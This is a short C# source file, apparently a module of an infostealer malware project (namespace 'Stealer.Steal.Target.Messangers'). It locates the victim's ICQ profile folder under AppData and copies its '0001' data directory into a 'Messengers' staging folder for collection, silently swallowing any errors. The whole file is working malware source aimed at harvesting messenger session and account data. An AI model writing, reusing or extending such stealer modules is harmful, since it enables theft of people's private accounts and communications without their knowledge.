using System;
using System.IO;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Messangers;

internal class Icq
{
	private static string ICQPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ICQ");

	public static void Start()
	{
		try
		{
			if (Directory.Exists(ICQPath))
			{
				string text = Path.Combine(ICQPath, "0001");
				if (Directory.Exists(text))
				{
					Counter.Icq = true;
					DynamicFiles.CopyDirectory(text, Path.Combine("Messengers", "ICQ", "0001"));
				}
			}
		}
		catch
		{
		}
	}
}
